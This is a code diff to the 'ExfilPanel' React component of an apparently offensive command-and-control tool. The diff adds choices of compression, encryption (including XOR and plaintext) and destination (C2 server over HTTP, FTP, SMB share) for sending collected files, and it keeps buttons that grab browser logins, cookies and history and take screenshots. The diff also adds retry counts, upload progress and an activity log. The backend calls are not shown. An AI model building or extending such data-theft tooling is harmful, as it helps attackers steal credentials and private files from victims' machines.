@@ -11,7 +11,12 @@ interface ExfilJob {
   createdAt: string;
   completedAt: string | null;
   encrypted: boolean;
-  destination: 'local' | 'c2';
+  encryptionAlgo: string;
+  compression: string;
+  destination: string;
+  destinationUrl: string;
+  retryCount: number;
+  maxRetries: number;
 }
 
 interface ExfilResult {
@@ -20,7 +25,9 @@ interface ExfilResult {
   type: string;
   hash: string;
   timestamp: string;
+  uploadProgress: number;
   uploaded: boolean;
+  error?: string;
 }
 
 const COLLECTION_PATTERNS = [
@@ -32,6 +39,26 @@ const COLLECTION_PATTERNS = [
   { label: 'Browser Data', types: 'Login Data, History, Cookies, Bookmarks' },
 ];
 
+const COMPRESSION_OPTIONS = [
+  { value: 'none', label: 'None (fastest)' },
+  { value: 'fast', label: 'Fast (zlib lv1)' },
+  { value: 'max', label: 'Max (zlib lv9)' },
+];
+
+const ENCRYPTION_OPTIONS = [
+  { value: 'aes-256-gcm', label: 'AES-256-GCM' },
+  { value: 'chacha20', label: 'ChaCha20 (AES fallback)' },
+  { value: 'xor', label: 'XOR (fast/weak)' },
+  { value: 'none', label: 'None (plaintext)' },
+];
+
+const DESTINATION_OPTIONS = [
+  { value: 'local', label: 'Local Disk' },
+  { value: 'c2', label: 'C2 Server (HTTP)' },
+  { value: 'ftp', label: 'FTP Server' },
+  { value: 'smb', label: 'SMB Share' },
+];
+
 export function ExfilPanel() {
   const [jobs, setJobs] = useState<ExfilJob[]>([]);
   const [selectedType, setSelectedType] = useState('file_collect');
@@ -41,6 +68,12 @@ export function ExfilPanel() {
   const [runningJob, setRunningJob] = useState<string | null>(null);
   const [totalSize, setTotalSize] = useState(0);
   const [encryptionKey, setEncryptionKey] = useState('');
+
+  // New options
+  const [compression, setCompression] = useState('max');
+  const [encryptionAlgo, setEncryptionAlgo] = useState('aes-256-gcm');
+  const [destination, setDestination] = useState('local');
+  const [destUrl, setDestUrl] = useState('');
 
   const loadJobs = useCallback(async () => {
     try {
@@ -57,24 +90,28 @@ export function ExfilPanel() {
     if (!jobName.trim() || !targetDir.trim()) return;
 
     try {
-      const job = await window.api.exfilCreateJob(jobName.trim(), targetDir.trim());
+      const job = await window.api.exfilCreateJob(
+        jobName.trim(), targetDir.trim(),
+        compression, encryptionAlgo, destination, destUrl,
+      );
       if (job) {
         setRunningJob(job.id);
-        // Run collection
         const result = await window.api.exfilCollectFiles(job.id);
         setRunningJob(null);
         loadJobs();
+        window.api.addActivity({ tab: 'exfil', type: 'start', label: `Collected: ${jobName.trim()}`, detail: `Target: ${targetDir.trim()} (${destination})` });
       }
     } catch (err: any) {
       alert(`Error: ${err.message}`);
       setRunningJob(null);
     }
-  }, [jobName, targetDir]);
+  }, [jobName, targetDir, compression, encryptionAlgo, destination, destUrl]);
 
   const handleScreenshot = useCallback(async () => {
     try {
       await window.api.exfilScreenshot();
       loadJobs();
+      window.api.addActivity({ tab: 'exfil', type: 'command', label: 'Screenshot Taken', detail: '' });
     } catch (err: any) {
       alert(`Error: ${err.message}`);
     }
@@ -84,6 +121,7 @@ export function ExfilPanel() {
     try {
       await window.api.exfilBrowserData();
       loadJobs();
+      window.api.addActivity({ tab: 'exfil', type: 'command', label: 'Browser Data Collected', detail: '' });
     } catch (err: any) {
       alert(`Error: ${err.message}`);
     }
@@ -96,6 +134,7 @@ export function ExfilPanel() {
         loadJobs();
         const key = await window.api.exfilKey();
         setEncryptionKey(key);
+        window.api.addActivity({ tab: 'exfil', type: 'success', label: 'Files Packaged', detail: path });
       }
     } catch (err: any) {
       alert(`Error: ${err.message}`);
@@ -104,20 +143,18 @@ export function ExfilPanel() {
 
   const handleExfiltrate = useCallback(async (jobId: string) => {
     try {
-      // Package first
-      const packagePath = await window.api.exfilPackage(jobId);
-      if (packagePath) {
-        await window.api.exfilSendToC2(packagePath, c2Url);
-        loadJobs();
-      }
+      await window.api.exfilExfiltrate(jobId);
+      loadJobs();
+      window.api.addActivity({ tab: 'exfil', type: 'success', label: 'Files Exfiltrated', detail: `Job: ${jobId.slice(0, 8)}...` });
     } catch (err: any) {
       alert(`Error: ${err.message}`);
     }
-  }, [c2Url]);
+  }, []);
 
   const handleClear = useCallback(async () => {
     await window.api.exfilClear();
     loadJobs();
+    window.api.addActivity({ tab: 'exfil', type: 'stop', label: 'All Jobs Cleared', detail: '' });
   }, []);
 
   const formatSize = (bytes: number): string => {
@@ -163,6 +200,55 @@ export function ExfilPanel() {
           </div>
         </div>
 
+        {/* Options row: Compression, Encryption, Destination */}
+        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-3">
+          <div>
+            <label className="text-[10px] text-gray-500 block mb-1">Compression</label>
+            <select value={compression} onChange={(e) => setCompression(e.target.value)}
+              className="input-field h-8 text-xs">
+              {COMPRESSION_OPTIONS.map(o => (
+                <option key={o.value} value={o.value} className="bg-midnight-900">{o.label}</option>
+              ))}
+            </select>
+          </div>
+          <div>
+            <label className="text-[10px] text-gray-500 block mb-1">Encryption</label>
+            <select value={encryptionAlgo} onChange={(e) => setEncryptionAlgo(e.target.value)}
+              className="input-field h-8 text-xs">
+              {ENCRYPTION_OPTIONS.map(o => (
+                <option key={o.value} value={o.value} className="bg-midnight-900">{o.label}</option>
+              ))}
+            </select>
+          </div>
+          <div>
+            <label className="text-[10px] text-gray-500 block mb-1">Destination</label>
+            <select value={destination} onChange={(e) => setDestination(e.target.value)}
+              className="input-field h-8 text-xs">
+              {DESTINATION_OPTIONS.map(o => (
+                <option key={o.value} value={o.value} className="bg-midnight-900">{o.label}</option>
+              ))}
+            </select>
+          </div>
+        </div>
+
+        {/* Destination URL (shown when not local) */}
+        {destination !== 'local' && (
+          <div className="mb-3">
+            <label className="text-[10px] text-gray-500 block mb-1">
+              {destination === 'c2' ? 'C2 Server URL' : destination === 'ftp' ? 'FTP Server (host:port)' : 'SMB Share Path'}
+            </label>
+            <input type="text" value={destUrl}
+              onChange={(e) => setDestUrl(e.target.value)}
+              className="input-field h-9 text-xs font-mono w-full"
+              placeholder={
+                destination === 'c2' ? 'http://127.0.0.1:8080' :
+                destination === 'ftp' ? 'ftp://server:21' :
+                '\\\\server\\share'
+              }
+            />
+          </div>
+        )}
+
         {/* Quick collect buttons */}
         <div className="flex flex-wrap gap-2 mb-3">
           <button onClick={handleCollect} disabled={!jobName.trim() || runningJob !== null}
@@ -183,18 +269,6 @@ export function ExfilPanel() {
               {p.label}
             </button>
           ))}
-        </div>
-      </div>
-
-      {/* C2 destination */}
-      <div className="card">
-        <div className="card-header">Exfiltration Target</div>
-        <div className="flex gap-2 items-center">
-          <input type="text" value={c2Url}
-            onChange={(e) => setC2Url(e.target.value)}
-            className="input-field h-9 text-xs font-mono flex-1" placeholder="http://your-c2-server:8080"
-          />
-          <span className="text-[10px] text-gray-600">or save locally</span>
         </div>
       </div>
 
@@ -230,11 +304,36 @@ export function ExfilPanel() {
                 </div>
               </div>
 
+              {/* Compression / Encryption / Destination badges */}
+              <div className="flex flex-wrap gap-1 mb-2">
+                <span className="text-[9px] px-1.5 py-0.5 rounded bg-midnight-800 text-gray-500 border border-midnight-700">
+                  📦 {job.compression || 'max'}
+                </span>
+                <span className="text-[9px] px-1.5 py-0.5 rounded bg-midnight-800 text-gray-500 border border-midnight-700">
+                  🔐 {job.encryptionAlgo || 'aes-256-gcm'}
+                </span>
+                <span className="text-[9px] px-1.5 py-0.5 rounded bg-midnight-800 text-gray-500 border border-midnight-700">
+                  📤 {job.destination || 'local'}
+                </span>
+                {job.retryCount > 0 && (
+                  <span className="text-[9px] px-1.5 py-0.5 rounded bg-yellow-900/20 text-yellow-600 border border-yellow-700/30">
+                    Retries: {job.retryCount}
+                  </span>
+                )}
+              </div>
+
               <div className="grid grid-cols-3 gap-2 text-[10px] text-gray-500 mb-2">
                 <span>Type: {job.type}</span>
                 <span>Files: {job.results.length}</span>
                 <span>Size: {formatSize(job.results.reduce((s, r) => s + r.size, 0))}</span>
               </div>
+
+              {/* Progress bar for running/exfil */}
+              {job.progress > 0 && job.progress < 100 && (
+                <div className="w-full bg-midnight-800 rounded-full h-1.5 mb-2">
+                  <div className="bg-redhawk-600 h-1.5 rounded-full transition-all" style={{ width: `${job.progress}%` }} />
+                </div>
+              )}
 
               {/* File list */}
               {job.results.length > 0 && (
@@ -248,6 +347,7 @@ export function ExfilPanel() {
                       <span className={`text-[10px] ${r.uploaded ? 'text-green-500' : 'text-gray-600'}`}>
                         {r.uploaded ? '✓' : '○'}
                       </span>
+                      {r.error && <span className="text-[10px] text-redhawk-400" title={r.error}>⚠</span>}
                     </div>
                   ))}
                 </div>
